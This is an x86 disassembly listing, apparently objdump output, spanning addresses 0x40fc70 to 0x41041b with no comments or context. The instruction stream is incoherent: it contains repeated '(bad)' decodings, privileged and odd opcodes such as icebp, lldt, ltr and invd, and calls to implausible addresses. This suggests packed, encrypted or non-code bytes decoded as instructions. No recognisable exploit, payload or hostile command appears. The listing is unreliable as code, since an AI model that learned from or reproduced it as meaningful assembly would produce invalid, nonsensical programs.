  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
